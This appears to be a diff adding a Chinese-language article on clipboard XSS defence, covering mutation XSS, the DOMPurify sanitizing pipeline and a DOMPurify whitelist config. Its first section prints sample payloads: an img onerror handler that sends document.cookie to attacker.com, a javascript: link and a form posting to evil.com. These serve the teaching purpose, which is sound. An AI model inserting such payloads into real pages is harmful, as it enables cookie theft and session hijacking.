@@ -123,5 +123,89 @@ flowchart TD
 当渲染包含外部第三方图床（如阿里云 OSS、AWS S3）的图片时，若图片未配置 CORS 响应头，Canvas 在调用 \`toDataURL()\` 或 \`toBlob()\` 时会抛出致命的 **SecurityError (The operation is insecure)**：
 - **前置预加载**：所有参与长图绘制的图片必须设置 \`img.crossOrigin = "anonymous"\`；
 - **回退机制**：若外部图床响应头缺失 \`Access-Control-Allow-Origin\`，客户端应通过本地 IndexedDB 缓存 Blob 转换为 \`blob:...\` 伪协议安全加载。
+`,
+
+  "clipboard/html-sanitizer-ast": `# DOMPurify 与 AST 白名单深度清洗算法
+
+> 本文深入剖析富文本剪贴板在跨应用复制粘贴过程中的 XSS 注入风险，详解突变型 XSS (mXSS) 防御原理、DOMPurify 清洗流水线及自定义 AST 标签白名单架构设计。
+
+---
+
+## 1. 富文本剪贴板的跨站脚本 (XSS) 风险
+
+剪贴板是系统级公共数据交换总线。当用户从不受信任的网页复制内容，或在多用户协作编辑器中粘贴排版源码时，黑客可在看似无害的 HTML 片段中隐匿恶意脚本：
+
+\`\`\`html
+<!-- 经典危险攻击向量示例 -->
+<img src="x" onerror="fetch('https://attacker.com/steal?c='+document.cookie)" />
+<a href="javascript:alert(document.domain)">点击查看详情</a>
+<form action="https://evil.com/phishing"><button>提交</button></form>
+\`\`\`
+
+若 Markdown 编辑器或富文本排版器未经严格安全清洗直接将用户输入或剪贴板 HTML 插入 DOM（如使用 \`innerHTML\`），将引发**存储型或反射型 XSS 漏洞**，导致用户凭据被盗、会话被劫持。
+
+---
+
+## 2. 突变型 XSS (Mutation XSS / mXSS) 深度剖析
+
+传统的简单字符串正则过滤（如过滤 \`<script>\`）在现代浏览器面前极其脆弱，最隐蔽的威胁源自 **mXSS（突变型跨站脚本）**：
+
+\`\`\`mermaid
+flowchart LR
+    Malicious["原始恶意字符串<br/>看起来无害或非标准语法"] --> BrowserDOM["浏览器 DOMParser 解析<br/>自动容错、补全标签并重构树"]
+    BrowserDOM --> Serializer["innerHTML 序列化输出<br/>DOM 树被重新序列化为字符串"]
+    Serializer --> Mutation["发生突变 (Mutation)<br/>原本安全的属性反转为执行脚本！"]
+\`\`\`
+
+例如在特定标签（如 \`<math>\` 或 \`<svg>\`）的命名空间切换中，浏览器在二次反序列化时会将某些属性突变为可执行的事件处理器。单纯依靠字符串黑名单无法抵御这种由浏览器容错机制催生的突变。
+
+---
+
+## 3. DOMPurify 工业级清洗流水线架构
+
+现代 Web 工程抵御 XSS 的基准方案是采用 **DOMPurify**。其核心哲学是**在真实的沙箱 DOM 树中执行基于白名单的深度遍历**：
+
+1. **沙箱上下文解析**：使用 \`DOMParser.parseFromString()\` 在完全隔离的内存 DOM 树中解析输入文本，杜绝任何外部网络请求或脚本提前触发；
+2. **递归树形遍历**：从根节点深度优先遍历每一个 Node 节点；
+3. **标签白名单校验 (Tag Whitelist)**：不在 \`ALLOWED_TAGS\` 中的未知标签（如 \`<script>\`, \`<iframe>\`, \`<object>\`）直接物理剥离；
+4. **属性协议校验 (Attribute Whitelist)**：逐个审查属性名。对 \`href\`、\`src\` 等属性，严格校验其 URL 协议，仅放行 \`http:\`、\`https:\`、\`mailto:\`、\`tel:\`，严厉拦截 \`javascript:\` 与 \`data:text/html\`；
+5. **DOM 重新序列化输出**：返回经过物理消毒的安全 HTML 字符串。
+
+---
+
+## 4. Markdown 知识库自定义安全白名单配置
+
+在 Markdown 与富文本知识库中，通常需要保留代码高亮、公式与 Callout 语义，推荐的标准白名单配置如下：
+
+\`\`\`javascript
+import DOMPurify from "dompurify";
+
+const SAFE_CONFIG = {
+  // 允许的安全 HTML 标签子集
+  ALLOWED_TAGS: [
+    "h1", "h2", "h3", "h4", "h5", "h6",
+    "p", "span", "div", "blockquote", "pre", "code",
+    "ul", "ol", "li", "table", "thead", "tbody", "tr", "th", "td",
+    "a", "img", "strong", "em", "del", "u", "mark", "sub", "sup",
+    "svg", "path", "circle", "rect", "line" // 支持行内矢量图标
+  ],
+  // 允许的属性白名单
+  ALLOWED_ATTR: [
+    "href", "src", "alt", "title", "class", "id",
+    "target", "rel", "width", "height", "viewBox", "fill", "stroke"
+  ],
+  // 强制给所有外部超链接附加安全属性
+  ADD_ATTR: ["rel"],
+  FORBID_TAGS: ["style", "script", "iframe", "form", "input"],
+};
+
+export function sanitizeHtml(dirtyHtml) {
+  return DOMPurify.sanitize(dirtyHtml, SAFE_CONFIG);
+}
+\`\`\`
+
+> [!CAUTION]
+> **切记防范 target="_blank" 漏洞**：所有允许新标签页打开的外链，必须自动补齐 \`rel="noopener noreferrer"\`，否则新打开的恶意第三方页面可通过 \`window.opener.location\` 篡改原文档窗口实施钓鱼欺诈。
 `
 };
+
